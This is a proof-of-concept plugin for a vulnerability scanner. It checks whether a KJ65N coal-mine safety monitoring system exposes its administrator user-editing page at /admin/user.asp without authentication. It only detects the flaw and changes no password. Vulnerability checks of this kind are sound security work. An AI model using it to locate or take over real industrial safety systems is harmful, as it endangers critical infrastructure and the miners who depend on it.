# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse, time

class Vuln(ABVuln):
    vuln_id = 'KJ65N_0003'  # 平台漏洞编号，留空
    name = 'KJ65N煤矿安全监控系统 未授权访问修改管理员密码'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2015-08-07'  # 漏洞公布时间
    desc = '''
        KJ65N煤矿安全监控系统未授权访问修改管理员密码。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'KJ65N煤矿安全监控系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'a2a73dc5-d884-4f90-b458-ac137f22e1bc'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #refer：WooYun-2015-131730 工控系列
            hh = hackhttp.hackhttp()
            arg = self.target
            start_time1 = time.time()
            p = '/admin/user.asp'
            url = arg + p
            code, head, res, errcode, _ = hh.http(url )
            if (code == 200) and('userEdit.asp?userId=' in res) and ('userMenuEdit.asp?userId=' in res):
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
